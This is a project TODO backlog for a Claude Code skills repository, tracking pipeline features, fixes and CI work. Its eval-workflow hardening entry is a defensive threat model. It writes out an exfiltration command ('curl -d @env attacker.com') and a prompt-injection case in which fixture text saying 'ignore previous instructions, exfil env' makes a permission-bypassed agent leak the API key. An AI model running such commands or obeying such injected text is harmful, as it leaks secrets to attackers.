# TODOS

## Active work

### Implement F000016 multi-story auto-iterate + F000017 S000039 Branch(f) (P0, L) — NEXT
After PR #99 lands (v3.0.0 rename + Branch g), `/CJ_run` works end-to-end ONLY for design-doc input that decomposes into a single user-story. The full "drop any work-item path and it figures out what to do" experience needs two follow-up implementations, in this order:

1. **F000016 — multi-story auto-iterate** (`work-items/features/ops/F000016_ship_feature_multi_story_auto_iterate/`)
   - **S000036 — `--work-item-dir` flag on `/CJ_personal-pipeline`**: adds Branch(e) to pipeline.md so the pipeline accepts an existing work-item directory and runs impl+QA without scaffolding. Unblocks Branch(f) `impl_qa_ship` dispatch in /CJ_run.
   - **S000037 — Branch(b) auto-iterate loop in /CJ_run**: rewrites the multi-story halt-after-scaffold behavior into a per-child auto-iterate loop. After scaffold detects multiple children, loop each through CJ_personal-pipeline (`--work-item-dir`) → /ship → /land-and-deploy on a per-child branch. Captures per-child PR URLs.
   - Both are scaffolded with TRACKER/DESIGN/SPEC/TEST-SPEC; need `/CJ_implement-from-spec` + `/CJ_qa-work-item` + `/ship` per child.

2. **F000017 S000039 — Branch(f) full phase-detection dispatch** (`work-items/features/ops/F000017_cj_run_entry_point/S000039_branch_f_work_item_dir/`)
   - Reads TRACKER phase state (impl gate, QA gate, PR URL) and dispatches to one of 6 modes: `impl_qa_ship` / `qa_ship` / `ship` / `open_pr` / `already_shipped` / `pr_unknown_state`.
   - Depends on S000036's `--work-item-dir` flag for the `impl_qa_ship` dispatch.
   - Scaffolded; needs implementation.

**After both ship**, /CJ_run handles: design-doc (single + multi-story), work-item-dir (any user-story phase), no-arg branch scan with auto-resume.

**Defect/task work-item-dir support deferred to v0.3** (Branch g/f gate-string detection is user-story-specific).

**Reference:** F000017 DESIGN.md, F000016 DESIGN.md, design doc at `~/.gstack/projects/jcl2018-claude-skills-templates/chjiang-claude-awesome-pasteur-36565c-design-20260513-154622.md`.

### ~~Rename user-authored skills to `CJ_` prefix (P2, M)~~ DONE
Closed by T000018 (v2.0.0). All 8 user-authored skills now namespaced under
`CJ_*`: `CJ_personal-workflow`, `CJ_system-health`, `CJ_scaffold-work-item`,
`CJ_implement-from-spec`, `CJ_qa-work-item`, `CJ_personal-pipeline`,
`CJ_suggest`, `CJ_company-workflow` (deprecated). Aligns with the existing
`anthropic-skills:*` and `KB_*` namespacing on the user's machine, ends slash-
command collision risk with upstream/native skills, marks ownership unambiguously.
**Breaking:** all slash-command names change post-deploy; consumers must run
`./scripts/skills-deploy install --include-deprecated` after pulling v2.0.0
to re-link the renamed skills under `~/.claude/skills/CJ_*/` and templates
under `~/.claude/templates/CJ_personal-workflow/`. Catalog, scripts (`validate.sh`,
`test.sh`, `test-deploy.sh`, `skills-deploy`, `eval.sh`,
`check-gates-update.sh`), CLAUDE.md routing block, README.md (regenerated),
work-copilot byte-mirror, and per-skill SKILL.md cross-references all updated
in lockstep. `git mv` used throughout so blame history follows.

### ~~scripts/test.sh SIGPIPE flake forces --admin overrides at ship time (P2, S)~~ DONE
Closed in v1.15.1. `scripts/test.sh` lines 1879/1893/1907/1918/1929/1950/1970 used `if [ ... ] && echo "$_t11_out" | grep -qF "needle"; then` patterns. Under `set -o pipefail` (inherited from `lib.sh`), GitHub Actions runners hit a SIGPIPE race: when `grep -qF` matched early and exited, `echo`'s next write hit a closed pipe → pipeline exits non-zero → enclosing `if` becomes false → `fail_test` triggered spuriously. Locally the race window was too tight to reproduce; in CI it tripped 2-3 times per run inconsistently. Two consecutive ships needed `--admin` overrides for the same flake: PR #74 (v1.13.1) and PR #75 (v1.14.0). **Fix shipped:** replaced each pipeline with a SIGPIPE-free `case "$_t11_out" in *"needle"*) true;; *) false;; esac` form across all 7 call sites in T000011 + autoplan D5 blocks. Full local suite green. Out-of-scope sites at lines 1700/1713/1732/1741/1816/1835 left alone (different test blocks — same fix can be applied if they ever flake). **Reference:** spawned as a follow-up task during /land-and-deploy on PR #75 (2026-05-10).

### ~~T000003: skills-deploy subfolder template support (P1, M)~~ DONE
Regex extended to allow `subfolder/name.md` patterns. `mkdir -p` added for subfolder creation during deploy. Company-workflow templates now deploy correctly.

### ~~Fork-aware update detection for skills-update-check (P3, S)~~ DONE
Closed by T000015 (v1.13.0). Implemented as part of F000014's bootstrap pipeline run — `/personal-pipeline` was invoked on a synthetic design doc, scaffolded T000015 task, and the implement subagent shipped the fork-aware fallback. The original "if origin missing, try upstream" gate was tightened during /ship adversarial review: now drives off fetch success rather than remote-configured-ness, so a dead-URL origin also falls through to upstream cleanly.

### ~~Pre-existing template-ownership test failures in test-deploy.sh (P2, S)~~ DONE
Re-pointed 22 references to `doc-RCA.md` (subfoldered to `templates/personal-workflow/doc-RCA.md` in v1.3.x) onto `templates/doc-SKILL-DESIGN.md` (the only remaining flat-path template). Tests T2/T4-T7 now pass end-to-end. Closed by D000016 alongside the wire-into-CI fix below.

### ~~Wire test-deploy.sh into CI / test.sh (P3, S)~~ DONE
Added invocation of `scripts/test-deploy.sh` to `scripts/test.sh` between the T11 manifest schema-parity tests and the Summary block. The existing wrapper-grep pre-flight check stays as-is (structural assertion). Negative test confirmed wire-up catches future regressions: reintroducing one stale reference produces `RESULT: FAIL` with named failure, restored → PASS. Closed by D000016.

### v1.17.0: drop telemetry `mode` field from personal-pipeline JSONL writes (P4, S)
v1.16.0 (S000029) flipped `/personal-pipeline` to single-mode. The telemetry `mode` field at `~/.gstack/analytics/personal-pipeline.jsonl` now always emits `"auto"` literal (deletion deferred to give external JSONL readers one release of grace). v1.17.0 should drop the field entirely from `skills/personal-pipeline/pipeline.md` Step 9.1 jq emit and the fallback `echo` line, and update the explanatory comment. Sunset trip-wire (Step 9.2) doesn't slice by mode anyway, so deletion is mechanical. **When:** v1.17.0 release window. **Reference:** `work-items/features/personal-workflow/F000014_personal_pipeline_orchestrator/S000029_auto_default/`.

### ~~Origin remote URL pinning for the upgrade path (P4, S)~~ DONE — closed by T000031 (v4.4.3): `skills-deploy install` captures `git remote get-url origin` as `manifest.upstream_url`; `skills-update-check` verifies the pinned URL matches the source repo's current origin before emitting the upgrade banner. Suppresses the banner + warns on mismatch. Backward-compatible (pre-T000031 manifests skip the check).

### ~~`/personal-pipeline` orchestrator over the 3 pipeline skills (P3, M)~~ DONE
Closed by F000014 (v1.13.0). Built per Approach B from the 2026-05-08 office-hours session, but with two design adjustments locked by S000026 spike findings: (a) AUQs are pre-collected at the orchestrator before Phase 2 dispatch (subagents have no AskUserQuestion tool in Claude Code 2.1.91 — `RESULT: AUQ_NEEDED` contract was unworkable), (b) RESULT-line parser is lenient (strips markdown blockquote prefixes + code fences, since subagents wrap RESULT inconsistently 60% of trials). Soak gate behavior: orchestrator carries an explicit sunset criterion (mechanical trip-wire on `~/.gstack/analytics/personal-pipeline.jsonl`, ≥3 of 5 `halted_at_gate` recommends delete; AUQ on invocation 6 then every 5). First real run on the Fork-aware update detection task ran end-to-end green during /ship.

### ~~Phase 3 lifecycle-gate auto-update gap: /ship and /land-and-deploy don't update trackers (P2, M)~~ DONE
Closed by F000011 (v1.10.0). Approach: combined option 2 + option 3 from the original list — built `/personal-workflow check --update` flag (the engine, in `scripts/check-gates-update.sh`) AND extended the existing post-merge hook to call it. Auto-trigger via `git pull main` after ship satisfies P5 (no new manual command to remember). 5 of 6 Phase 3 gates auto-marked from external state; `E2E walked manually` explicit-excluded; `/personal-workflow check — validation passed` deferred in v1 due to recursion risk. Documented in `work-items/features/personal-workflow/F000011_phase3_gate_autoupdate/`.

### ~~`/scaffold-work-item` Step 5 idempotency hole (P3, S)~~ DONE — closed by T000024 (v3.5.1)
Step 5 of `skills/scaffold-work-item/scaffold.md` always generates a fresh ID by incrementing the max existing tracker prefix. Re-running on `chjiang-main-design-20260508-102829.md` (F000010's source design doc) would write a duplicate F000011 alongside the existing F000010 — Step 9's idempotency check uses TARGET_PATH derived from the freshly-generated NEW_ID, so the existing dir is never inspected. Closes the deferred S000017 AC-5 (idempotency). **Fix:** before Step 5, either read the source design doc's `**Status: SCAFFOLDED → ...**` footer (Step 12 already writes it) OR grep `work-items/*/TRACKER.md` frontmatter for a tracker referencing this design-doc path; if matched, set NEW_ID to the existing ID and let Step 9 boundary-check + NO-OP run as designed. **When:** before the next re-run of `/scaffold-work-item` on an existing work item — until then, the bootstrap workflow (backup → delete → re-scaffold → diff) is the working alternative. **Reference:** found 2026-05-08 during S000018/S000019 verification.

### ~~`/personal-workflow check` Step 18 traceability parser comma-split (P3, S)~~ DONE
Closed by S000022 (F000012, v1.11.1). Step 18 sub-step 3 prose tightened with explicit "split the cell on comma and trim whitespace" instruction; two worked examples added (multi-AC cell + mixed cell with placeholder); contract paragraph at the end of sub-step 3 names the split-before-filter ordering. Verified 2026-05-09 against F000010's S000018 + S000019 TEST-SPECs (which contain real multi-AC cells `AC-1, AC-2, AC-3`, `AC-5, AC-6`, `AC-2, AC-4`).

### ~~F000010 pipeline gap: implement+qa skills are user-story-only (P3, M)~~ PARTIAL — option 1 implemented in v1.11.0 (S000021)
S000021 (in F000012_pipeline_parity, v1.11.0) implemented option 1 — generalize per-type. `/implement-from-spec` and `/qa-work-item` now dispatch on `_TRACKER.md` frontmatter `type:` field and route to per-type input artifacts (user-story → SPEC + DESIGN; defect → RCA + test-plan; task → TRACKER + test-plan; feature → AskUserQuestion to pick a child). Per-type Phase 2 gate transitions implemented; commit gates (`Fix committed` for defects, `Core changes committed` for tasks) remain user/`/ship`-owned. Existing user-story flows preserved identically. **What's still pending:** (a) defect-path live integration test — manual smoke S1 in S000021's TEST-SPEC requires running `/scaffold-work-item <doc> --type defect` → `/implement-from-spec` → `/qa-work-item` end-to-end on a real defect. Will exercise post-merge when the next real defect surfaces. (b) Task-path live integration test — same shape but for task type; no real task work-items exist yet to verify against. (c) Defect QA E2E split — defect QA in v1 treats all `test-plan.md` rows as smoke-equivalent; if real-world demand surfaces for defect E2E with subagent dispatch, file a follow-up.

### ~~`CJ_qa-work-item` + `CJ_implement-from-spec` catalog descriptions still say "user-story" (P3, S)~~ DONE
Closed in v2.0.4 (this PR). `skills-catalog.json` entries for `CJ_qa-work-item` and `CJ_implement-from-spec` previously described scope as "a CJ_personal-workflow user-story" — but F000012 / v1.11.0 (S000021) generalized both skills to dispatch on tracker `type:` and handle all four work-item types (user-story, defect, task, feature-via-child-AUQ). The catalog descriptions never got updated, and `README.md` is auto-generated from the catalog (`scripts/generate-readme.sh`), so the staleness propagated to the public Skills table. **Fix shipped:** synced both catalog entries to match the (correct) `SKILL.md` frontmatter descriptions; regenerated `README.md` from the catalog. Skill names also updated to `CJ_*` post-v2.0.0 rename in the entry title. **Reference:** found 2026-05-09 during F000014's /document-release post-ship audit; closed 2026-05-10 during /document-release for v2.0.4 (post-v2.0.2 doc-sync session).

### Verify `/personal-pipeline` works on a fresh remote machine (P3, S)
v1.13.0 shipped `/personal-pipeline` and the bootstrap pipeline run was validated on the author's machine. Need a clean-room verification on a different machine: fresh git clone, `./scripts/setup.sh` (or `skills-deploy install`), then run the orchestrator on a synthetic design doc end-to-end. **Why it matters:** Agent-tool subagent behavior, AskUserQuestion availability inside subagents (S000026 spike key finding), and `claude -p` headless behavior are all environment-dependent — the spike findings were captured on Claude Code 2.1.91 with the Opus overlay. A fresh-machine run validates the design holds across setups and catches any path-resolution / upstream-skill discovery regressions. **Steps:** (1) clone repo on remote machine, (2) `./scripts/setup.sh` (or `git pull && ./scripts/skills-deploy install` if already cloned), (3) verify `~/.claude/skills/personal-pipeline/SKILL.md` exists, (4) `/office-hours` to produce a small design doc, (5) `/personal-pipeline <design-doc>` end-to-end, (6) check `~/.gstack/analytics/personal-pipeline.jsonl` for the telemetry line. **When:** before recommending the skill broadly, or when a second machine becomes available. **Reference:** found 2026-05-09 during v1.13.0's /document-release session.

### F000013 V1 eval harness — nightly CI (P1, S)
S000024 shipped in v1.16.1: 4 personal-workflow cases (#2–#5 in the V1 case index) plus a supplementary `check-untested-p0` to satisfy AC-7 after system-health deferral; full suite verified via `bash scripts/eval.sh` at $0.99 / ~72s wall-clock. system-health behavioral cases (`report-clean-system`, `report-with-issues`) deferred to V2 — `tests/eval/lib/run-case.sh` doesn't fake `$HOME` and `system-health` hard-codes `~/.claude/`, so fixtures under `tests/eval/system-health/<case>/fixture/` are invisible. Path forward: opt-in `HOME=$tmpdir` runner flag. Remaining: **S000025** (nightly CI workflow at `.github/workflows/eval-nightly.yml`, first real CI run validation). After S000025 ships, mark the parent eval-harness entry DONE-V1.

### Re-do brief-mode for `/CJ_personal-pipeline` against auto-only main (P2, M)
Closed PR #79 (v1.15.2 scaffold) hit a 3-way queue collision with PR #80 (v1.16.0 auto-only refactor) at /land-and-deploy Step 3.4: VERSION drift (1.15.2 vs new base 1.16.0), S000029 ID collision (PR #80 took it for `S000029_auto_default` under F000014; our scaffold gave us `S000029_phase0_spike` under F000015), and a now-stale design Constraint that says brief mode "MUST work with both `--auto` and manual orchestrator modes" — manual mode no longer exists. The brief-mode value prop is still valid (small work-items shouldn't need full /office-hours), but the design needs re-grounding. **Carry over from PR #79:** problem statement, approach A vs B vs C, error rows, filename grammar, fenced-verbatim brief insulation, 8 error-handling rows, spec review history (27 issues fixed across 2 iterations, 9/10 score). **Edit out:** the "MUST work with both --auto and manual modes" constraint, Premise 4's "v1.1 user-story follow-up" framing (the type-guardrail story changes under auto-only), telemetry mode-field values (was `auto|manual|brief|brief+auto`, now just `default|brief`). **Fresh IDs:** F000016+ and S000032+ (PR #80 already used S000029, our P3 fix below now also accounts for this via open-PR scan). **Steps:** (1) `/office-hours` from a new worktree with the closed-PR design as starting context, (2) `/CJ_personal-pipeline` (auto is now the only mode), (3) `/ship`. **Reference:** closed [PR #79](https://github.com/jcl2018/claude-skills-templates/pull/79); preserved design doc at `~/.gstack/projects/jcl2018-claude-skills-templates/chjiang-claude-lucid-sanderson-bcccff-design-20260509-224555.md`. Found 2026-05-09 during /land-and-deploy halt; skill names updated to `CJ_*` post-v2.0.0.

### ~~`/CJ_scaffold-work-item` queue-collision detection at ID-pick time (P3, S)~~ DONE
Closed in v2.0.2. `skills/CJ_scaffold-work-item/scaffold.md` Step 5 previously generated the next work-item ID by scanning only local `work-items/**/*_TRACKER.md`. Parallel worktrees scaffolding from the same baseline both grabbed the same ID — exactly what happened with PR #80 (`S000029_auto_default` under F000014) and closed PR #79 (`S000029_phase0_spike` under F000015) on 2026-05-09. Different parent dirs avoided filesystem collision but duplicated the global S000029 ID, violating personal-workflow's monotonic ID convention, and the second branch only learned about the collision at /land-and-deploy Step 3.4 (post-push). **Fix shipped:** Step 5 now scans two sources: local `find work-items` AND open PRs targeting main (capped at 5; `gh pr view --json files` per PR; treats any `${PREFIX}NNNNNN_*_TRACKER.md` path in an open PR as a claimed ID). Skip-silent if `gh` is offline/unauthenticated. Latent bug also fixed: arithmetic now uses `10#$HIGHEST` to force base-10 (bash interpreted leading-zero strings like `000029` as octal, breaking on digits 8/9). Verified under both bash and zsh. Limitation: only catches collisions where the parallel worktree has ALREADY pushed and opened a PR; two worktrees both scaffolding without push still collide, with /land-and-deploy Step 3.4 as the safety net. **Reference:** found 2026-05-09 when /land-and-deploy Step 3.4 caught the original S000029 collision between closed PR #79 and merged PR #80; closed in v2.0.2 ship (rebumped from v2.0.1 after PR #81 landed first).

### ~~`/CJ_personal-pipeline` Step 5.1 sensitive-surface regex misses `skills/*/scripts/` (P3, S)~~ DONE — closed by D000019 (v3.4.1)
Closed in v3.4.1 (D000019). Step 5.1 regex broadened from `skills/[^/]+/scripts/[^/]+\.sh` to `skills/[^/]+/scripts/[^/]+` (any file under scripts/, including .bash, .py, extensionless executables — trust boundary is the directory, not the extension). Step 5.1 input artifact selection is now type-aware (defects scan RCA + test-plan; tasks scan TRACKER + test-plan; user-stories continue to scan SPEC) — without this, the regex extension would have been dead for D000017's verified failure mode (sensitive path lived in test-plan.md, not SPEC). Empty-`$SCAN_INPUTS` guard at the grep prevents silent bypass for defect/task work-items missing both RCA/test-plan/TRACKER. New "Skill scripts" row added to the Sensitive-Surface Pre-Scan Reference table.

### ~~`/CJ_personal-pipeline` Step 7 strict halt-on-ambiguous blocks defects and tasks (P3, S)~~ DONE — closed by D000019 (v3.4.1)
Closed in v3.4.1 (D000019). Step 7 now type-aware: if `WORK_ITEM_TYPE in {defect, task}` AND `SMOKE=green` AND `PHASE2_GATES=green` AND `E2E=ambiguous`, continue silently to Step 8 (same green path as the user-story branch). User-story strict-halt behavior preserved. Edit #0 prerequisite loads `$TRACKER` + `$WORK_ITEM_TYPE` (CRLF-safe via `tr -d '\r'`, frontmatter-anchored awk) at each consuming Bash block — bash variables don't persist across orchestrator-model Bash calls; the load is re-asserted in Step 4, Step 5.1, Step 7, and Step 8. Phase 3 dispatch prompt also tightened to document `E2E=ambiguous` semantics for defect/task (preserves qa.md's "n/a for type" contract, not rewritten as green).

### ~~`/CJ_implement-from-spec` should `chmod +x` shell scripts it creates (P4, S)~~ DONE — closed by T000022 (v3.4.2)
Closed in v3.4.2 (T000022). Post-write `chmod +x` sub-step added to `skills/CJ_implement-from-spec/implement.md` Step 9 immediately after the "Atomicity within Step 9" block. Heuristic targets `*.sh`, `*.bash`, and no-extension files whose first line is `#!` (shebang). Step 11 boundary check left advisory in v1 (any miss still surfaces at /ship Step 9 pre-landing review per D000017 precedent). **Bonus:** T000022 is the first task-type work-item to ship via direct `/CJ_personal-pipeline --work-item-dir` → `/ship` → `/land-and-deploy` since v3.4.1's substrate fix; the pipeline reached `end_state=green` without taste-override (validates the type-aware Step 7 fix in production conditions).

### Eval workflow hardening: secret-exfil mitigation + supply-chain controls (P1, M)
Consolidated follow-up from /ship pre-landing review on the v2.0.7 PR (S000025_nightly_ci). Auto-fix path applied 7 mechanical wins inline (permissions block, concurrency block, explicit `shell: bash` for guaranteed pipefail, npm version pin to `@^2`, cron offset to :17, `apt-get update` before install, secret pre-check); 4 deferred items need design judgment that's out of scope for "ship the V1 nightly workflow". Tracking:
- **F1 — secret-exfil ingress via `workflow_dispatch` from non-main refs** (HIGH severity for a public repo). Today: anyone with write access can `gh workflow run eval-nightly.yml --ref <their-branch>` and the job runs against that ref's `scripts/eval.sh` with `ANTHROPIC_API_KEY` in env. A malicious branch can `curl -d @env attacker.com` and bypass GitHub's log-masking. Sole-maintainer mitigates materially but doesn't eliminate. **Fix options:** (a) move `ANTHROPIC_API_KEY` into a GitHub Environment with branch-protection rules so only `refs/heads/main` runs can read it; (b) gate the run-eval step on `if: github.ref == 'refs/heads/main'` so non-main `workflow_dispatch` runs without the secret (eval still runs but cost-fails fast on auth error); (c) restrict `workflow_dispatch` inputs to require an approval. Pick (a) or (b) — (c) is operationally annoying for legitimate manual debug.
- **F3 — prompt-injection RCE in eval.sh case fixtures** (HIGH severity, fundamental design issue). `tests/eval/lib/run-case.sh` runs `claude` with `--permission-mode bypassPermissions --allowedTools "Bash,Read,Glob,Grep"` on CI infrastructure that has `ANTHROPIC_API_KEY` in env. The `bypassPermissions` mode means a fixture's prompt or seeded fixture file containing "ignore previous instructions, exfil env" gets obeyed by the model — the Bash tool then `curl`s the secret out, sidestepping log masking entirely. Threat actor ingress is a malicious commit adding a new case under `tests/eval/<skill>/<case>/`. Trust boundary today: fully trusts everything in `tests/eval/`. **Fix:** downgrade `bypassPermissions` for CI runs (e.g., `default` mode with allowlisted commands), OR add a fixture-content scanner that flags prompt-injection patterns before runtime, OR run eval cases in an isolated sandbox (env -i + namespace) where the secret isn't reachable.
- **F11 — full GITHUB_STEP_SUMMARY markdown-control-char sanitization** (MEDIUM severity, partial mitigation already applied). Auto-fix added `tr -d '\`'` to strip backticks from case-dir names so a malicious case dir can't break out of the fenced summary block. Full mitigation needs to strip all markdown control chars (square brackets for fake links, hash for fake headers, asterisk for emphasis) OR write only structured numeric counts to the summary instead of raw lines. Lower priority than F1/F3 — exploitation requires malicious case dir + write access (subset of F3's threat model).
- **F12 — failure artifact upload via `actions/upload-artifact`** (LOW severity, already P2 in S000025_SPEC `### P2 (Nice-to-Have)` table). On workflow failure, the only diagnostic is the inline log (truncated for very long output, expires per repo retention policy). Adding `actions/upload-artifact@v4` with `if: failure()` for `eval-output.txt` keeps the file for 90+ days. Pure additive change once F1/F3 are resolved.
**When:** before V2 of the eval harness, or sooner if the threat surface expands (additional contributors with write access, third-party fork PRs become a thing). **Reference:** v2.0.7 PR `/ship` pre-landing review on 2026-05-11; full finding details in the PR body's `## Pre-Landing Review` and `## Adversarial Review` sections (Codex + Claude subagent convergent on F1+F7 — F7 was the auto-fix npm pin).

### ~~Pre-ship vs post-ship AC categorization for `/CJ_qa-work-item` (P3, S)~~ PARTIAL — sub-item (b) closed by T000027 (v3.5.4, PR #114): qa.md Step 4 filters post-ship E2E rows out of subagent dispatch with `[qa-e2e-deferred]` journal entry. **Remaining:** (a) optional `phase: post-ship` field on TEST-SPEC E2E rows (or `## Post-Ship E2E` section); (c) dedicated Phase 3 gate `Post-ship ACs verified` on user-story / defect / task TRACKER templates; (d) `/CJ_personal-workflow check --update` post-merge inference to mark the new gate from journal entries written after `gh workflow run` succeeds. Track as a follow-up task when the next work-item with structurally post-ship ACs hits the QA flow.
When a work-item's acceptance criteria include rows that are structurally only verifiable post-ship (e.g., S000025 ACs 2/3/4/7 require `gh workflow run eval-nightly.yml` against merged main — the workflow file doesn't exist on remote refs reachable by `gh workflow run` until the PR ships), the current QA flow forces an awkward path: the QA subagent dispatches per qa.md Step 7, returns `ambiguous` for the structurally-impossible rows, the user adjudicates "treat as green" per qa.md Step 8, and Phase 2 QA-owned gates flip to `[x]` even though those ACs aren't actually verified. Repeated for every work-item that ships new CI surfaces. **Fix sketch:** (a) add an optional `phase: post-ship` field to TEST-SPEC E2E rows (or a separate `## Post-Ship E2E` section); (b) teach `qa.md` Step 4 to filter post-ship rows out of the subagent dispatch with a `[qa-e2e-deferred]` journal entry naming the rows + their ACs; (c) add a dedicated Phase 3 gate `Post-ship ACs verified` to the user-story tracker template (and equivalents for defect/task templates); (d) teach `/CJ_personal-workflow check --update`'s post-merge inference to mark the new gate from journal entries written after `gh workflow run` succeeds. Cleaner separation than the current pretend-green-then-track-in-Todos pattern, and removes the per-work-item adjudication overhead. **When:** before the next work-item with structurally post-ship ACs hits `/CJ_qa-work-item`. **Reference:** found 2026-05-11 during S000025 QA — D5 adjudication burned a full AUQ on a structurally predetermined answer; full discussion in S000025_TRACKER.md `[qa-adjudication]` journal entry.

### ~~`skills-deploy install` pins manifest `source` to cwd; breaks when run from a worktree (P3, S)~~ DONE — closed by T000025 (v3.5.2)
`scripts/skills-deploy install` records `manifest.source` (in `~/.claude/.skills-templates.json`) as the running clone's `REPO_ROOT`, computed from the script's own path. When invoked from `.claude/worktrees/<name>/scripts/skills-deploy`, the manifest gets pinned to that ephemeral worktree path. Once the worktree is removed (Conductor cleanup, `git worktree remove`, etc.), `skills-deploy doctor` reports `FAIL: source path '<dead-worktree>' no longer exists` and emits WARN for every skill as `source directory missing in repo` — even though the per-skill SKILL.md symlinks in `~/.claude/skills/CJ_*/` still resolve correctly to the main checkout (symlinks use absolute paths to `/Users/chjiang/Documents/projects/claude-skills-templates/skills/...`, not the worktree). Update-check and the gstack-update-check fallback also key off `manifest.source` for `git pull --ff-only` during inline upgrades, so a stale source silently breaks the upgrade path too. **Workaround (already applied 2026-05-11):** re-run `skills-deploy install` from the main checkout, not a worktree. **Fix options:** (a) detect when `REPO_ROOT` is under `<toplevel>/.claude/worktrees/` and refuse with an instructive error pointing at the main toplevel — strictest, safest; (b) auto-resolve via `git rev-parse --path-format=absolute --git-common-dir` to find the main repo's git-dir and record THAT toplevel as `source` regardless of which worktree the script ran from — silently does the right thing; (c) print a WARN-and-continue, keeping current behavior but visible. Option (b) is the "boil the lake" pick — also fixes future Conductor / per-feature-worktree flows where running from main isn't always convenient. **When:** before the next time a worktree-based install pollutes the manifest (high-frequency hit because Conductor + per-feature worktree workflows run scripts from worktree paths by default). **Reference:** found 2026-05-11 while investigating "CJ_ skills missing in autocomplete in other repos" — root cause was a different vector (autocomplete was just stale state, resolved when user re-tested), but `skills-deploy doctor` from a worktree surfaced the pinned-to-deleted-worktree manifest. Manifest re-anchored to main checkout; learning logged via `gstack-learnings-log` under key `skills_deploy_source_pins_to_cwd`.

### ~~/CJ_run multi-story: deferred items from autoplan review (P3, M)~~ DONE — closed by T000030 (v4.4.1): added a "Deferred decisions" section to F000016_TRACKER.md so reviewers don't re-litigate the 5 deferred items (budget gate, `--no-auto-iterate`, `--run-id` passthrough, `--work-item-dir` migration guide, dependency-aware batching). Reference: autoplan review 2026-05-13 on branch `claude/awesome-pasteur-36565c`.

### ~~Branch(g) full PR-state detection for `/CJ_run` (P2, M)~~ DONE — closed by T000026 (v3.5.3)
Branch(g)'s current candidate filter uses TRACKER Phase 1/2/3 gate states to determine "in-progress" — it doesn't call `gh pr view` because the user-story TRACKER template has no `pr:` frontmatter field (PR links live in a Markdown `## PRs` section). This works correctly for the common case (gates accurately reflect ship state), but a tracker with `[x]` gates that was force-merged or manually edited could slip past. **Fix sketch:** (a) extend `tracker-user-story.md` with an optional `pr:` frontmatter field plus a section parser that recognizes both styles; (b) call `gh pr view "$PR_URL" --json state` with a cache to avoid N round-trips per candidate; (c) gate Branch(g) on `MERGED` state for explicit deduplication. **When:** when a false positive surfaces in real use; for now the gate-state filter catches all known shipped work-items. **Reference:** pre-landing review on F000017 S000038 (2026-05-13).

### ~~/CJ_goal not portable beyond claude-skills-templates — hardcoded `./scripts/validate.sh` always halts at scaffold (P3, S)~~ DONE — closed by T000028 (v3.5.5) via Approach D (delete goal.sh:526 + guard pipeline.md:528)
`scripts/goal.sh` line 526 runs `./scripts/validate.sh` from the repo root as the post-scaffold boundary check. Any repo without `scripts/validate.sh` returns 127 (command-not-found), `halt halted_at_scaffold` fires, and `/CJ_goal` cannot progress past Phase 1 for any TODO that reaches the scaffold step. Preflight gates work fine in any repo (TODOS.md-only reads), so the failure mode is silent until a TODO actually passes preflight.

**Observed:** 2026-05-14 in `~/projects/portfolio` (downstream private repo). User had tagged 40 TODOs with `(Pn, X)` so `/loop /CJ_goal` could drain. First non-skipped tick scaffolded `work-items/tasks/ops/T000006_document_all_auto_run_services_launchd/` (tracker + test-plan written), then halted on the validate step. The scaffolded tracker was structurally fine — the halt fired purely because `./scripts/validate.sh` exited 127.

**Tension with current routing.** SKILL.md "Notes" already says "Workbench-only scope. Only the claude-skills-templates repo's TODOS.md is the source. Generalizing to downstream repos is a v2 question per `[[feedback_workbench_scope]]`." But the routing rules in `~/.claude/rules/skill-routing.md` route `/CJ_goal` for "fix this TODO" / "auto-resolve TODOs" / "loop through TODOs" in *any* repo. The two pieces of guidance disagree, and a downstream user invoking `/loop /CJ_goal` silently inherits the breakage.

**Cosmetic side issue (same flow):** goal.sh's awk parse of `/CJ_suggest`'s table emits `awk: newline in string` warnings when a TODO body cell contains a newline. A truncated `**What:** Create a docs/services.md ... Current services:` chunk leaks into adjacent table cells, so the scaffolded `test-plan.md` Steps column ends up containing body fragments. Doesn't change the halt outcome but produces a malformed test-plan if/when the validator gate ever passes.

**Possible fixes (pick one):**
1. **No-op when validate.sh is missing.** `[ -x ./scripts/validate.sh ] && { ./scripts/validate.sh >/dev/null 2>&1 || halt halted_at_scaffold "validate.sh refused after scaffold writes" "$NAKED_HEADING" "$NEW_ID"; }`. Smallest diff; preserves workbench behavior; lets downstream repos run `/CJ_goal` without retrofitting a validator. Risk: a downstream scaffold that *should* be structurally invalid would ship anyway.
2. **Feature-flag the validator** behind a marker file (e.g. `.cj-goal-workbench`) so workbench keeps strict checks and downstream opts in.
3. **Document the workbench-only scope harder** and remove `/CJ_goal` from the global routing rules so it doesn't get suggested in downstream repos. No code change; resolves the silent-failure issue at the routing layer.

**Reference:** downstream session that surfaced this was `~/projects/portfolio` branch `claude/modest-sutherland-5026e9`.

### ~~`/CJ_goal` sensitive-surface auto-decline under `/loop` always stops the loop (P3, S)~~ DONE — closed by S000043 (v3.6.1, PR #118) via halt-class semantic rename `_user_declined` → `_auto_declined` + add to continue set
Observed 2026-05-15 in `/loop /CJ_goal` session that shipped T000024-T000027 (PRs #111-#114). At iteration 8 the script picked TODO `validate.sh structural check via graph JSON (P2, M)`, whose body mentions `scripts/validate.sh` three times (the file the fix touches). `scripts/goal.sh` hit the sensitive-surface regex match, found no interactive AUQ tool available under `/loop` context, and auto-declined — emitting `end_state=halted_at_sensitive_surface_user_declined`. Per the design spec, that end_state is in the STOP set ("user explicitly paused at AUQ — intent is to stop"), so the loop halted with 9 more eligible TODOs in the queue.

The design's STOP rationale assumed a user-driven AUQ decline. Under `/loop` there is no user — the script must auto-decide, and "auto-decline" is the safe default for trust-boundary work. But mapping that auto-default to the same end_state as an explicit-user-pause conflates two very different signals and prematurely terminates the loop.

**Fix sketch (pick one):**
1. **Distinguish the two halt classes.** Introduce `halted_at_sensitive_surface_auto_declined` (loop continues; row added to skip-list) for the no-AUQ-available auto-decline path, and keep `halted_at_sensitive_surface_user_declined` (loop STOPS) only for the interactive path where a real user chose halt. This matches how `halted_at_preflight` is already in the continue set — sensitive-surface auto-decline is structurally similar.
2. **Pre-filter sensitive-surface TODOs at candidate-selection.** Pair with the `[[/CJ_suggest pre-filter against /CJ_goal preflight criteria]]` TODO above: extend the pre-filter set to also exclude TODO bodies that match the sensitive-surface regex. /loop never even attempts these — single-shot `/CJ_goal "<fragment>"` still works because the user is interactive.
3. **Document and accept.** Add an explicit note in SKILL.md that `/loop /CJ_goal` stops at the first sensitive-surface TODO, and recommend manually adding such headings to the skip-list before `/loop` invocation.

